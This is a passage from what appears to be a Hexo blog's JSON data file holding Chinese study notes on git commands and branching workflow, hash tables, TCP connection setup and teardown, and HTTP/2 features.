推送本地分支到远端</p>\n</li>\n<li><p>git merge 把某个分支的代码合并到当前分支</p>\n</li>\n<li><p>git pull = git fetch + git merge 把远端分支更新到本地</p>\n</li>\n<li><p>git status 当前分支状态</p>\n</li>\n</ul>\n<blockquote>\n<p>我一般习惯配置别名 alias，比如 merge 变成 mg，这样少打几个字母</p>\n</blockquote>\n<h2 id=\"常用命令组合\"><a href=\"#常用命令组合\" class=\"headerlink\" title=\"常用命令组合\"></a>常用命令组合</h2><p>1.丢掉本地未提交改动</p>\n<p>git checkout -f</p>\n<p>2.丢掉本地已提交但未推送到远端的提交</p>\n<p>git reset –hard origin/xxx</p>\n<h2 id=\"测试和发布\"><a href=\"#测试和发布\" class=\"headerlink\" title=\"测试和发布\"></a>测试和发布</h2><blockquote>\n<p>内部使用 gitlab</p>\n</blockquote>\n<ul>\n<li>master 主分支：用于外网线上发布，永远保持跟线上一致</li>\n<li>develop 分支：用于发布测试环境</li>\n</ul>\n<h3 id=\"日常开发说明\"><a href=\"#日常开发说明\" class=\"headerlink\" title=\"日常开发说明\"></a>日常开发说明</h3><blockquote>\n<p>详情参见<a href=\"http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\" target=\"_blank\" rel=\"noopener\">git flow</a></p>\n</blockquote>\n<ul>\n<li>日常开发从 master 拉一个分支 feature-xxx 分支到本地</li>\n<li>要发布测试环境，直接 mg 到 develop，然后发布</li>\n<li>要发布线上，直接 mg 到 master，然后发布</li>\n<li>日常紧急 bug 修复，可拉一个 hotfix 分支</li>\n</ul>\n"},{"title":"读《图解算法》04-散列表（hash table）","date":"2018-05-27T06:43:27.000Z","_content":"\n# 为什么散列表会出现\n\n* 场景：如果超市买东西结账的时候，售货员在一个本子里查找价格\n* 如果是有序的（二分查找）还好，时间是 O（logn）,如果是无序（简单查找）的话，那就是 O（n）\n* 如果直接有一个 O(1)的查找速度就好了\n\n# 散列函数\n\n> 将输入映射到数字\n\n* 一致性：输入 apple 时得到的是 4，那么每次输入 apple 都必须是 4\n* 不同性：不同的输入将得到不同的输出。如果输入 apple 和 yoki 都得到 4，那么这是一个不好的散列函数。\n\n## 创造散列表\n\n> 结合散列函数和数组\n\n* 创建一个空数组\n* apple 输入到散列函数，输出 3，然后把 apple 的价格存储到数组索引 3\n* 接着各个类推，知道存完数组\n* 然后我们要找 apple 的价格，就把 apple 输入交给散列函数，得到 3 去数组里面找\n\n# 散列表的经典应用\n\n> 查找，防止重复，用于缓存\n\n## 查找\n\n* 被用于大海捞针的查找\n* 这个就不用细说了，类似的有 dns 解析\n\n## 防止重复\n\n> 场景：负责一个投票站，每个人只能投一票，如何避免重复投票\n\n* 有一个方法是：有人来投票，就将它记录在一个投票名单里面，然后接下来的人都遍历这个投票名单，如果有就不能投票，但是这样就列表会越来越长，就会变慢\n* 另外一种就是散列表，超快\n\n## 缓存\n\n* 浏览器缓存的数据存储在散列表里面\n* 如果访问 facebook 的页面，会先检查散列表中是否存储了该页面\n* 如果不在缓存中，才去访问服务器，然后把数据放到缓存里，这样下次有人访问就可以直接命中缓存\n\n# 冲突\n\n> 事实上不可能不同的输入都能获得不同的值\n\n* 假设有一个数组包含 26 个位置，而我们使用的散列函数非常简单，按照字母表顺序分配位置\n* apple 第一个，bear 第二个，接下来来了一个 banana，理应分到第二个，但是这个时候第二个位置已经是 bear 了\n* 这个就叫冲突，解决冲突的办法有很多，简单的就是在这个冲突的位置存储一个链表，bear 末尾的指针指向 banana\n* 所以散列函数很重要，好的散列函数将 key 均匀的映射到散列表的不同位置\n\n## 如何避免冲突\n\n* 较低的填装因子\n  * 散列表包含的元素数：位置总数就是填装因子\n  * 越小越好，满了只能调整长度，换一个更长的数组\n  * 一个不错的经验规则就是，一旦填装因子大于 0.7，那么就要调整散列表的长度\n* 良好的散列函数\n  * SHA 函数\n\n# 散列表性能如何\n\n## 平均情况\n\n* 查找，插入，删除都是 O（1）,常量时间\n\n## 最糟糕情况\n\n* 查找，插入，删除都是 O（n）,线性时间\n\n> 为什么会有两种情况，这是因为有了冲突可能会靠链表解决，n 个长度的链表，最好情况下没有冲突，就常量时间\n","source":"_posts/study-hashtable-01.md","raw":"---\ntitle: 读《图解算法》04-散列表（hash table）\ndate: 2018-05-27 14:43:27\ntags: 图解算法\n---\n\n# 为什么散列表会出现\n\n* 场景：如果超市买东西结账的时候，售货员在一个本子里查找价格\n* 如果是有序的（二分查找）还好，时间是 O（logn）,如果是无序（简单查找）的话，那就是 O（n）\n* 如果直接有一个 O(1)的查找速度就好了\n\n# 散列函数\n\n> 将输入映射到数字\n\n* 一致性：输入 apple 时得到的是 4，那么每次输入 apple 都必须是 4\n* 不同性：不同的输入将得到不同的输出。如果输入 apple 和 yoki 都得到 4，那么这是一个不好的散列函数。\n\n## 创造散列表\n\n> 结合散列函数和数组\n\n* 创建一个空数组\n* apple 输入到散列函数，输出 3，然后把 apple 的价格存储到数组索引 3\n* 接着各个类推，知道存完数组\n* 然后我们要找 apple 的价格，就把 apple 输入交给散列函数，得到 3 去数组里面找\n\n# 散列表的经典应用\n\n> 查找，防止重复，用于缓存\n\n## 查找\n\n* 被用于大海捞针的查找\n* 这个就不用细说了，类似的有 dns 解析\n\n## 防止重复\n\n> 场景：负责一个投票站，每个人只能投一票，如何避免重复投票\n\n* 有一个方法是：有人来投票，就将它记录在一个投票名单里面，然后接下来的人都遍历这个投票名单，如果有就不能投票，但是这样就列表会越来越长，就会变慢\n* 另外一种就是散列表，超快\n\n## 缓存\n\n* 浏览器缓存的数据存储在散列表里面\n* 如果访问 facebook 的页面，会先检查散列表中是否存储了该页面\n* 如果不在缓存中，才去访问服务器，然后把数据放到缓存里，这样下次有人访问就可以直接命中缓存\n\n# 冲突\n\n> 事实上不可能不同的输入都能获得不同的值\n\n* 假设有一个数组包含 26 个位置，而我们使用的散列函数非常简单，按照字母表顺序分配位置\n* apple 第一个，bear 第二个，接下来来了一个 banana，理应分到第二个，但是这个时候第二个位置已经是 bear 了\n* 这个就叫冲突，解决冲突的办法有很多，简单的就是在这个冲突的位置存储一个链表，bear 末尾的指针指向 banana\n* 所以散列函数很重要，好的散列函数将 key 均匀的映射到散列表的不同位置\n\n## 如何避免冲突\n\n* 较低的填装因子\n  * 散列表包含的元素数：位置总数就是填装因子\n  * 越小越好，满了只能调整长度，换一个更长的数组\n  * 一个不错的经验规则就是，一旦填装因子大于 0.7，那么就要调整散列表的长度\n* 良好的散列函数\n  * SHA 函数\n\n# 散列表性能如何\n\n## 平均情况\n\n* 查找，插入，删除都是 O（1）,常量时间\n\n## 最糟糕情况\n\n* 查找，插入，删除都是 O（n）,线性时间\n\n> 为什么会有两种情况，这是因为有了冲突可能会靠链表解决，n 个长度的链表，最好情况下没有冲突，就常量时间\n","slug":"study-hashtable-01","published":1,"updated":"2018-06-04T13:27:00.598Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qy002q0iofdnjgdv6b","content":"<h1 id=\"为什么散列表会出现\"><a href=\"#为什么散列表会出现\" class=\"headerlink\" title=\"为什么散列表会出现\"></a>为什么散列表会出现</h1><ul>\n<li>场景：如果超市买东西结账的时候，售货员在一个本子里查找价格</li>\n<li>如果是有序的（二分查找）还好，时间是 O（logn）,如果是无序（简单查找）的话，那就是 O（n）</li>\n<li>如果直接有一个 O(1)的查找速度就好了</li>\n</ul>\n<h1 id=\"散列函数\"><a href=\"#散列函数\" class=\"headerlink\" title=\"散列函数\"></a>散列函数</h1><blockquote>\n<p>将输入映射到数字</p>\n</blockquote>\n<ul>\n<li>一致性：输入 apple 时得到的是 4，那么每次输入 apple 都必须是 4</li>\n<li>不同性：不同的输入将得到不同的输出。如果输入 apple 和 yoki 都得到 4，那么这是一个不好的散列函数。</li>\n</ul>\n<h2 id=\"创造散列表\"><a href=\"#创造散列表\" class=\"headerlink\" title=\"创造散列表\"></a>创造散列表</h2><blockquote>\n<p>结合散列函数和数组</p>\n</blockquote>\n<ul>\n<li>创建一个空数组</li>\n<li>apple 输入到散列函数，输出 3，然后把 apple 的价格存储到数组索引 3</li>\n<li>接着各个类推，知道存完数组</li>\n<li>然后我们要找 apple 的价格，就把 apple 输入交给散列函数，得到 3 去数组里面找</li>\n</ul>\n<h1 id=\"散列表的经典应用\"><a href=\"#散列表的经典应用\" class=\"headerlink\" title=\"散列表的经典应用\"></a>散列表的经典应用</h1><blockquote>\n<p>查找，防止重复，用于缓存</p>\n</blockquote>\n<h2 id=\"查找\"><a href=\"#查找\" class=\"headerlink\" title=\"查找\"></a>查找</h2><ul>\n<li>被用于大海捞针的查找</li>\n<li>这个就不用细说了，类似的有 dns 解析</li>\n</ul>\n<h2 id=\"防止重复\"><a href=\"#防止重复\" class=\"headerlink\" title=\"防止重复\"></a>防止重复</h2><blockquote>\n<p>场景：负责一个投票站，每个人只能投一票，如何避免重复投票</p>\n</blockquote>\n<ul>\n<li>有一个方法是：有人来投票，就将它记录在一个投票名单里面，然后接下来的人都遍历这个投票名单，如果有就不能投票，但是这样就列表会越来越长，就会变慢</li>\n<li>另外一种就是散列表，超快</li>\n</ul>\n<h2 id=\"缓存\"><a href=\"#缓存\" class=\"headerlink\" title=\"缓存\"></a>缓存</h2><ul>\n<li>浏览器缓存的数据存储在散列表里面</li>\n<li>如果访问 facebook 的页面，会先检查散列表中是否存储了该页面</li>\n<li>如果不在缓存中，才去访问服务器，然后把数据放到缓存里，这样下次有人访问就可以直接命中缓存</li>\n</ul>\n<h1 id=\"冲突\"><a href=\"#冲突\" class=\"headerlink\" title=\"冲突\"></a>冲突</h1><blockquote>\n<p>事实上不可能不同的输入都能获得不同的值</p>\n</blockquote>\n<ul>\n<li>假设有一个数组包含 26 个位置，而我们使用的散列函数非常简单，按照字母表顺序分配位置</li>\n<li>apple 第一个，bear 第二个，接下来来了一个 banana，理应分到第二个，但是这个时候第二个位置已经是 bear 了</li>\n<li>这个就叫冲突，解决冲突的办法有很多，简单的就是在这个冲突的位置存储一个链表，bear 末尾的指针指向 banana</li>\n<li>所以散列函数很重要，好的散列函数将 key 均匀的映射到散列表的不同位置</li>\n</ul>\n<h2 id=\"如何避免冲突\"><a href=\"#如何避免冲突\" class=\"headerlink\" title=\"如何避免冲突\"></a>如何避免冲突</h2><ul>\n<li>较低的填装因子<ul>\n<li>散列表包含的元素数：位置总数就是填装因子</li>\n<li>越小越好，满了只能调整长度，换一个更长的数组</li>\n<li>一个不错的经验规则就是，一旦填装因子大于 0.7，那么就要调整散列表的长度</li>\n</ul>\n</li>\n<li>良好的散列函数<ul>\n<li>SHA 函数</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"散列表性能如何\"><a href=\"#散列表性能如何\" class=\"headerlink\" title=\"散列表性能如何\"></a>散列表性能如何</h1><h2 id=\"平均情况\"><a href=\"#平均情况\" class=\"headerlink\" title=\"平均情况\"></a>平均情况</h2><ul>\n<li>查找，插入，删除都是 O（1）,常量时间</li>\n</ul>\n<h2 id=\"最糟糕情况\"><a href=\"#最糟糕情况\" class=\"headerlink\" title=\"最糟糕情况\"></a>最糟糕情况</h2><ul>\n<li>查找，插入，删除都是 O（n）,线性时间</li>\n</ul>\n<blockquote>\n<p>为什么会有两种情况，这是因为有了冲突可能会靠链表解决，n 个长度的链表，最好情况下没有冲突，就常量时间</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"为什么散列表会出现\"><a href=\"#为什么散列表会出现\" class=\"headerlink\" title=\"为什么散列表会出现\"></a>为什么散列表会出现</h1><ul>\n<li>场景：如果超市买东西结账的时候，售货员在一个本子里查找价格</li>\n<li>如果是有序的（二分查找）还好，时间是 O（logn）,如果是无序（简单查找）的话，那就是 O（n）</li>\n<li>如果直接有一个 O(1)的查找速度就好了</li>\n</ul>\n<h1 id=\"散列函数\"><a href=\"#散列函数\" class=\"headerlink\" title=\"散列函数\"></a>散列函数</h1><blockquote>\n<p>将输入映射到数字</p>\n</blockquote>\n<ul>\n<li>一致性：输入 apple 时得到的是 4，那么每次输入 apple 都必须是 4</li>\n<li>不同性：不同的输入将得到不同的输出。如果输入 apple 和 yoki 都得到 4，那么这是一个不好的散列函数。</li>\n</ul>\n<h2 id=\"创造散列表\"><a href=\"#创造散列表\" class=\"headerlink\" title=\"创造散列表\"></a>创造散列表</h2><blockquote>\n<p>结合散列函数和数组</p>\n</blockquote>\n<ul>\n<li>创建一个空数组</li>\n<li>apple 输入到散列函数，输出 3，然后把 apple 的价格存储到数组索引 3</li>\n<li>接着各个类推，知道存完数组</li>\n<li>然后我们要找 apple 的价格，就把 apple 输入交给散列函数，得到 3 去数组里面找</li>\n</ul>\n<h1 id=\"散列表的经典应用\"><a href=\"#散列表的经典应用\" class=\"headerlink\" title=\"散列表的经典应用\"></a>散列表的经典应用</h1><blockquote>\n<p>查找，防止重复，用于缓存</p>\n</blockquote>\n<h2 id=\"查找\"><a href=\"#查找\" class=\"headerlink\" title=\"查找\"></a>查找</h2><ul>\n<li>被用于大海捞针的查找</li>\n<li>这个就不用细说了，类似的有 dns 解析</li>\n</ul>\n<h2 id=\"防止重复\"><a href=\"#防止重复\" class=\"headerlink\" title=\"防止重复\"></a>防止重复</h2><blockquote>\n<p>场景：负责一个投票站，每个人只能投一票，如何避免重复投票</p>\n</blockquote>\n<ul>\n<li>有一个方法是：有人来投票，就将它记录在一个投票名单里面，然后接下来的人都遍历这个投票名单，如果有就不能投票，但是这样就列表会越来越长，就会变慢</li>\n<li>另外一种就是散列表，超快</li>\n</ul>\n<h2 id=\"缓存\"><a href=\"#缓存\" class=\"headerlink\" title=\"缓存\"></a>缓存</h2><ul>\n<li>浏览器缓存的数据存储在散列表里面</li>\n<li>如果访问 facebook 的页面，会先检查散列表中是否存储了该页面</li>\n<li>如果不在缓存中，才去访问服务器，然后把数据放到缓存里，这样下次有人访问就可以直接命中缓存</li>\n</ul>\n<h1 id=\"冲突\"><a href=\"#冲突\" class=\"headerlink\" title=\"冲突\"></a>冲突</h1><blockquote>\n<p>事实上不可能不同的输入都能获得不同的值</p>\n</blockquote>\n<ul>\n<li>假设有一个数组包含 26 个位置，而我们使用的散列函数非常简单，按照字母表顺序分配位置</li>\n<li>apple 第一个，bear 第二个，接下来来了一个 banana，理应分到第二个，但是这个时候第二个位置已经是 bear 了</li>\n<li>这个就叫冲突，解决冲突的办法有很多，简单的就是在这个冲突的位置存储一个链表，bear 末尾的指针指向 banana</li>\n<li>所以散列函数很重要，好的散列函数将 key 均匀的映射到散列表的不同位置</li>\n</ul>\n<h2 id=\"如何避免冲突\"><a href=\"#如何避免冲突\" class=\"headerlink\" title=\"如何避免冲突\"></a>如何避免冲突</h2><ul>\n<li>较低的填装因子<ul>\n<li>散列表包含的元素数：位置总数就是填装因子</li>\n<li>越小越好，满了只能调整长度，换一个更长的数组</li>\n<li>一个不错的经验规则就是，一旦填装因子大于 0.7，那么就要调整散列表的长度</li>\n</ul>\n</li>\n<li>良好的散列函数<ul>\n<li>SHA 函数</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"散列表性能如何\"><a href=\"#散列表性能如何\" class=\"headerlink\" title=\"散列表性能如何\"></a>散列表性能如何</h1><h2 id=\"平均情况\"><a href=\"#平均情况\" class=\"headerlink\" title=\"平均情况\"></a>平均情况</h2><ul>\n<li>查找，插入，删除都是 O（1）,常量时间</li>\n</ul>\n<h2 id=\"最糟糕情况\"><a href=\"#最糟糕情况\" class=\"headerlink\" title=\"最糟糕情况\"></a>最糟糕情况</h2><ul>\n<li>查找，插入，删除都是 O（n）,线性时间</li>\n</ul>\n<blockquote>\n<p>为什么会有两种情况，这是因为有了冲突可能会靠链表解决，n 个长度的链表，最好情况下没有冲突，就常量时间</p>\n</blockquote>\n"},{"title":"浅谈TCP","date":"2018-04-19T07:33:27.000Z","_content":"\n## TCP\n\n> tcp 协议对应于传输层，而 HTTP 协议对应于应用层。\n\n* http 协议基于 tcp 协议\n\n### TCP/IP 协议分层模型\n\n* 物理层将二进制的 0 和 1 和电压高低，光的闪灭和电波的强弱信号进行转换\n* 链路层代表驱动\n* 网络层\n  * 使用 IP 协议，IP 协议基于 IP 转发分包数据\n  * ip 协议是个不可靠协议，不会重发\n  * ip 协议发送失败会使用 icmp 协议通知失败\n  * ARP 解析 ip 中的 mac 地址，mac 地址由网卡出厂提供\n  * ip 还隐含链路层的功能，不管双方底层的链路层是啥，都能通信\n* 传输层\n  * 通用的 tcp 和 udp 协议\n    * tcp 协议面向有连接，能正确处理丢包，传输顺序错乱的问题，但是为了建立与断开链接，需要至少七次的发包收包，资源浪费\n    * udp 面向无连接，不管对方有没有收到，如果要得到通知，需要通过应用层\n* 会话层\n  * tcp/ip 分层中，会话层，表示层，应用层集中在一起\n  * 网络管理通过 snmp 协议\n\n### TCP 三次握手，建立连接\n\n* 客户端-发送带有 syn 标志的数据包——一次握手-服务端\n* 服务端-发送带有 syn/ack 标志的数据包——二次握手-客户端\n* 客户端-发送带有 ack 标志的数据包-三次握手-服务端\n\n### TCP 四次挥手，断开连接\n\n* 客户端-发送一个 fin，用来关闭客户端到服务器的数据传送\n* 服务器-收到这个 fin，发回一个 ack，确认序号为收到的序号为 1。和 syn 一样，一个 fin 将占用一个序号\n* 服务器-关闭与客户端的连接，发送一个 fin 给客户端\n* 客户端-发回 ack 报文确定，并将确认序号设置为收到序号加 1\n\n### TCP 和 UDP\n\n* tcp 就好比在微信聊天，你说一句我说一句\n* udp 就好比我找你，直接就打电话，简单粗暴\n","source":"_posts/study-http-tcp.md","raw":"---\ntitle: 浅谈TCP\ndate: 2018-04-19 15:33:27\ntags: Http\n---\n\n## TCP\n\n> tcp 协议对应于传输层，而 HTTP 协议对应于应用层。\n\n* http 协议基于 tcp 协议\n\n### TCP/IP 协议分层模型\n\n* 物理层将二进制的 0 和 1 和电压高低，光的闪灭和电波的强弱信号进行转换\n* 链路层代表驱动\n* 网络层\n  * 使用 IP 协议，IP 协议基于 IP 转发分包数据\n  * ip 协议是个不可靠协议，不会重发\n  * ip 协议发送失败会使用 icmp 协议通知失败\n  * ARP 解析 ip 中的 mac 地址，mac 地址由网卡出厂提供\n  * ip 还隐含链路层的功能，不管双方底层的链路层是啥，都能通信\n* 传输层\n  * 通用的 tcp 和 udp 协议\n    * tcp 协议面向有连接，能正确处理丢包，传输顺序错乱的问题，但是为了建立与断开链接，需要至少七次的发包收包，资源浪费\n    * udp 面向无连接，不管对方有没有收到，如果要得到通知，需要通过应用层\n* 会话层\n  * tcp/ip 分层中，会话层，表示层，应用层集中在一起\n  * 网络管理通过 snmp 协议\n\n### TCP 三次握手，建立连接\n\n* 客户端-发送带有 syn 标志的数据包——一次握手-服务端\n* 服务端-发送带有 syn/ack 标志的数据包——二次握手-客户端\n* 客户端-发送带有 ack 标志的数据包-三次握手-服务端\n\n### TCP 四次挥手，断开连接\n\n* 客户端-发送一个 fin，用来关闭客户端到服务器的数据传送\n* 服务器-收到这个 fin，发回一个 ack，确认序号为收到的序号为 1。和 syn 一样，一个 fin 将占用一个序号\n* 服务器-关闭与客户端的连接，发送一个 fin 给客户端\n* 客户端-发回 ack 报文确定，并将确认序号设置为收到序号加 1\n\n### TCP 和 UDP\n\n* tcp 就好比在微信聊天，你说一句我说一句\n* udp 就好比我找你，直接就打电话，简单粗暴\n","slug":"study-http-tcp","published":1,"updated":"2018-04-20T09:14:44.432Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034r0002s0iofhcrm0wcu","content":"<h2 id=\"TCP\"><a href=\"#TCP\" class=\"headerlink\" title=\"TCP\"></a>TCP</h2><blockquote>\n<p>tcp 协议对应于传输层，而 HTTP 协议对应于应用层。</p>\n</blockquote>\n<ul>\n<li>http 协议基于 tcp 协议</li>\n</ul>\n<h3 id=\"TCP-IP-协议分层模型\"><a href=\"#TCP-IP-协议分层模型\" class=\"headerlink\" title=\"TCP/IP 协议分层模型\"></a>TCP/IP 协议分层模型</h3><ul>\n<li>物理层将二进制的 0 和 1 和电压高低，光的闪灭和电波的强弱信号进行转换</li>\n<li>链路层代表驱动</li>\n<li>网络层<ul>\n<li>使用 IP 协议，IP 协议基于 IP 转发分包数据</li>\n<li>ip 协议是个不可靠协议，不会重发</li>\n<li>ip 协议发送失败会使用 icmp 协议通知失败</li>\n<li>ARP 解析 ip 中的 mac 地址，mac 地址由网卡出厂提供</li>\n<li>ip 还隐含链路层的功能，不管双方底层的链路层是啥，都能通信</li>\n</ul>\n</li>\n<li>传输层<ul>\n<li>通用的 tcp 和 udp 协议<ul>\n<li>tcp 协议面向有连接，能正确处理丢包，传输顺序错乱的问题，但是为了建立与断开链接，需要至少七次的发包收包，资源浪费</li>\n<li>udp 面向无连接，不管对方有没有收到，如果要得到通知，需要通过应用层</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>会话层<ul>\n<li>tcp/ip 分层中，会话层，表示层，应用层集中在一起</li>\n<li>网络管理通过 snmp 协议</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"TCP-三次握手，建立连接\"><a href=\"#TCP-三次握手，建立连接\" class=\"headerlink\" title=\"TCP 三次握手，建立连接\"></a>TCP 三次握手，建立连接</h3><ul>\n<li>客户端-发送带有 syn 标志的数据包——一次握手-服务端</li>\n<li>服务端-发送带有 syn/ack 标志的数据包——二次握手-客户端</li>\n<li>客户端-发送带有 ack 标志的数据包-三次握手-服务端</li>\n</ul>\n<h3 id=\"TCP-四次挥手，断开连接\"><a href=\"#TCP-四次挥手，断开连接\" class=\"headerlink\" title=\"TCP 四次挥手，断开连接\"></a>TCP 四次挥手，断开连接</h3><ul>\n<li>客户端-发送一个 fin，用来关闭客户端到服务器的数据传送</li>\n<li>服务器-收到这个 fin，发回一个 ack，确认序号为收到的序号为 1。和 syn 一样，一个 fin 将占用一个序号</li>\n<li>服务器-关闭与客户端的连接，发送一个 fin 给客户端</li>\n<li>客户端-发回 ack 报文确定，并将确认序号设置为收到序号加 1</li>\n</ul>\n<h3 id=\"TCP-和-UDP\"><a href=\"#TCP-和-UDP\" class=\"headerlink\" title=\"TCP 和 UDP\"></a>TCP 和 UDP</h3><ul>\n<li>tcp 就好比在微信聊天，你说一句我说一句</li>\n<li>udp 就好比我找你，直接就打电话，简单粗暴</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"TCP\"><a href=\"#TCP\" class=\"headerlink\" title=\"TCP\"></a>TCP</h2><blockquote>\n<p>tcp 协议对应于传输层，而 HTTP 协议对应于应用层。</p>\n</blockquote>\n<ul>\n<li>http 协议基于 tcp 协议</li>\n</ul>\n<h3 id=\"TCP-IP-协议分层模型\"><a href=\"#TCP-IP-协议分层模型\" class=\"headerlink\" title=\"TCP/IP 协议分层模型\"></a>TCP/IP 协议分层模型</h3><ul>\n<li>物理层将二进制的 0 和 1 和电压高低，光的闪灭和电波的强弱信号进行转换</li>\n<li>链路层代表驱动</li>\n<li>网络层<ul>\n<li>使用 IP 协议，IP 协议基于 IP 转发分包数据</li>\n<li>ip 协议是个不可靠协议，不会重发</li>\n<li>ip 协议发送失败会使用 icmp 协议通知失败</li>\n<li>ARP 解析 ip 中的 mac 地址，mac 地址由网卡出厂提供</li>\n<li>ip 还隐含链路层的功能，不管双方底层的链路层是啥，都能通信</li>\n</ul>\n</li>\n<li>传输层<ul>\n<li>通用的 tcp 和 udp 协议<ul>\n<li>tcp 协议面向有连接，能正确处理丢包，传输顺序错乱的问题，但是为了建立与断开链接，需要至少七次的发包收包，资源浪费</li>\n<li>udp 面向无连接，不管对方有没有收到，如果要得到通知，需要通过应用层</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>会话层<ul>\n<li>tcp/ip 分层中，会话层，表示层，应用层集中在一起</li>\n<li>网络管理通过 snmp 协议</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"TCP-三次握手，建立连接\"><a href=\"#TCP-三次握手，建立连接\" class=\"headerlink\" title=\"TCP 三次握手，建立连接\"></a>TCP 三次握手，建立连接</h3><ul>\n<li>客户端-发送带有 syn 标志的数据包——一次握手-服务端</li>\n<li>服务端-发送带有 syn/ack 标志的数据包——二次握手-客户端</li>\n<li>客户端-发送带有 ack 标志的数据包-三次握手-服务端</li>\n</ul>\n<h3 id=\"TCP-四次挥手，断开连接\"><a href=\"#TCP-四次挥手，断开连接\" class=\"headerlink\" title=\"TCP 四次挥手，断开连接\"></a>TCP 四次挥手，断开连接</h3><ul>\n<li>客户端-发送一个 fin，用来关闭客户端到服务器的数据传送</li>\n<li>服务器-收到这个 fin，发回一个 ack，确认序号为收到的序号为 1。和 syn 一样，一个 fin 将占用一个序号</li>\n<li>服务器-关闭与客户端的连接，发送一个 fin 给客户端</li>\n<li>客户端-发回 ack 报文确定，并将确认序号设置为收到序号加 1</li>\n</ul>\n<h3 id=\"TCP-和-UDP\"><a href=\"#TCP-和-UDP\" class=\"headerlink\" title=\"TCP 和 UDP\"></a>TCP 和 UDP</h3><ul>\n<li>tcp 就好比在微信聊天，你说一句我说一句</li>\n<li>udp 就好比我找你，直接就打电话，简单粗暴</li>\n</ul>\n"},{"title":"HTTP/2的学习","date":"2018-05-22T06:09:09.000Z","_content":"\n# HTTP/1.0 的通信\n\n* 每完成一次请求和响应，TCP 连接就会断开。\n\n# HTTP/1.1 的通信\n\n* TCP 连接有 RTT（Round Trip Time，就是往返时延的），每次请求一个资源就要有一次 RTT，用户可是等不得这种慢节奏的响应。\n* 到了 1.1，tcp 可以持久连接了，请求同域名下的 n 个资源，可以节约(n-1)\\*rtt 的时间\n* http 管道技术虽然实现了客户端向服务器并行发送多个请求，但是 1.1 有严格的串行返回机制（前一个响应没有完成，下一个响应就不能返回），如果第一个响应时间很长，那么后面的响应处理完了也没法发送，只能被缓存起来，占用服务器内存。\n\n# SPDY\n\n* 谷歌推出的传输协议，最终演变成 HTTP/2\n\n# HTTP/2.0\n\n> 二进制分帧层，多向请求与响应，优先级与依赖性，首部压缩，服务器推送\n\n## 二进制分帧层\n\n* tcp 连接在客户端和服务器间建立了一条运输的通道，可以双向通信\n* 当一端要向另一端发送消息的时候，把这个拆成几部分（帧），然后通过发起一个流来对这些帧进行发送，最后在另一端将同一个流的帧组合\n* 就好比搬家，先把桌子拆成零件，再通过几次的搬运，到了新家，再把桌子重新拼装起来\n\n## 多向请求与响应（多路复用）\n\n* 一端发送消息会先对消息进行拆分，与此同时，也会给同一个消息拆分出来的帧带上一个编号（stream ID），这样另一端接受这些帧后就可以根据编号进行组合\n\n## 优先级和依赖性\n\n* 流可以有一个优先级属性\n\n## 首部压缩\n\n* 在客户端和服务器各自维护一个首部表，表中用索引代表首部名，上一次发送，两端都会记住已发送哪些首部，下一次传输只用传输差异的数据，相同的数据直接用索引表示即可。\n\n## 服务器推送\n\n* 服务器可以对一个客户端请求发送多个响应，也就是说，除了对最初请求的响应外，服务器还可以额外向客户端推送资源\n\n> 由上可得 http/2\n\n* 通过二进制分帧和多路复用机制，有效解决了 1.x 下请求/响应延迟的问题\n* 新的首部压缩技术使得 1.x 首部信息臃肿的问题得到解决\n* 优先级和依赖性与服务器推送使得我们可以更有效地利用好这个单一的 tcp 连接\n\n# 推荐阅读\n\n* [http/2 安利篇(一)](https://aotu.io/notes/2016/03/17/http2-char/)\n* [http/2 优化篇(二)](https://aotu.io/notes/2016/06/14/http2/index.html)\n* [谷歌的 http2 学习篇](https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn)\n","source":"_posts/study-http2.md","raw":"---\ntitle: HTTP/2的学习\ndate: 2018-05-22 14:09:09\ntags: 计算机网络\n---\n\n# HTTP/1.0 的通信\n\n* 每完成一次请求和响应，TCP 连接就会断开。\n\n# HTTP/1.1 的通信\n\n* TCP 连接有 RTT（Round Trip Time，就是往返时延的），每次请求一个资源就要有一次 RTT，用户可是等不得这种慢节奏的响应。\n* 到了 1.1，tcp 可以持久连接了，请求同域名下的 n 个资源，可以节约(n-1)\\*rtt 的时间\n* http 管道技术虽然实现了客户端向服务器并行发送多个请求，但是 1.1 有严格的串行返回机制（前一个响应没有完成，下一个响应就不能返回），如果第一个响应时间很长，那么后面的响应处理完了也没法发送，只能被缓存起来，占用服务器内存。\n\n# SPDY\n\n* 谷歌推出的传输协议，最终演变成 HTTP/2\n\n# HTTP/2.0\n\n> 二进制分帧层，多向请求与响应，优先级与依赖性，首部压缩，服务器推送\n\n## 二进制分帧层\n\n* tcp 连接在客户端和服务器间建立了一条运输的通道，可以双向通信\n* 当一端要向另一端发送消息的时候，把这个拆成几部分（帧），然后通过发起一个流来对这些帧进行发送，最后在另一端将同一个流的帧组合\n* 就好比搬家，先把桌子拆成零件，再通过几次的搬运，到了新家，再把桌子重新拼装起来\n\n## 多向请求与响应（多路复用）\n\n* 一端发送消息会先对消息进行拆分，与此同时，也会给同一个消息拆分出来的帧带上一个编号（stream ID），这样另一端接受这些帧后就可以根据编号进行组合\n\n## 优先级和依赖性\n\n* 流可以有一个优先级属性\n\n## 首部压缩\n\n* 在客户端和服务器各自维护一个首部表，表中用索引代表首部名，上一次发送，两端都会记住已发送哪些首部，下一次传输只用传输差异的数据，相同的数据直接用索引表示即可。\n\n## 服务器推送\n\n* 服务器可以对一个客户端请求发送多个响应，也就是说，除了对最初请求的响应外，服务器还可以额外向客户端推送资源\n\n> 由上可得 http/2\n\n* 通过二进制分帧和多路复用机制，有效解决了 1.x 下请求/响应延迟的问题\n* 新的首部压缩技术使得 1.x 首部信息臃肿的问题得到解决\n* 优先级和依赖性与服务器推送使得我们可以更有效地利用好这个单一的 tcp 连接\n\n# 推荐阅读\n\n* [http/2 安利篇(一)](https://aotu.io/notes/2016/03/17/http2-char/)\n* [http/2 优化篇(二)](https://aotu.io/notes/2016/06/14/http2/index.html)\n* [谷歌的 http2 